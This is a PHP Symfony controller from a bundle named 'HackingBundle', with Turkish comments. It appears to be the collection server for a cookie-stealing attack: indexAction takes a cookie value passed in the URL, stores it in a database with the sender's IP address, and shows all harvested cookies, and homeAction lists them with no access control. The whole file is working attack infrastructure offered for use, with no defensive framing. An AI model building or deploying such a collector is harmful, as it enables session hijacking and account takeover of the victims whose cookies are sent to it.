<?php

namespace Core\HackingBundle\Controller;

use Core\HackingBundle\Entity\Cookie;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Request;

class DefaultController extends Controller
{
    public function indexAction($cookie = null,Request $request)
    {

        /**
         * get ile gelen cookie değeri 0 dan büyükse.
         */
        if ( strlen(trim($cookie)) ==  0 )
        {
            echo "Cookie değeri boş!";
            exit;
        }

        /**
         * Doctrine
         */
        $em = $this->getDoctrine()->getManager();

        /**
         * IP
         */
        $ip_address = $request->getClientIp();

        /**
         * Veritabanına cookie değerini yazalım
         */
        $yeni_cookie = new Cookie();
        $yeni_cookie->setCookie($cookie);
        $yeni_cookie->setIp($ip_address);

        $em->persist($yeni_cookie);
        $em->flush();


        /**
         * Tüm cookileri çekelim
         */
        $tum_cookieler = $em->getRepository('CoreHackingBundle:Cookie')->findAll();


        return $this->render('CoreHackingBundle:Default:index.html.twig',array('cookies'=>$tum_cookieler));
    }

    public function homeAction()
    {
        /**
         * Doctrine
         */
        $em = $this->getDoctrine()->getManager();


        /**
         * Tüm cookileri çekelim
         */
        $tum_cookieler = $em->getRepository('CoreHackingBundle:Cookie')->findAll();


        return $this->render('CoreHackingBundle:Default:index.html.twig',array('cookies'=>$tum_cookieler));
    }
}
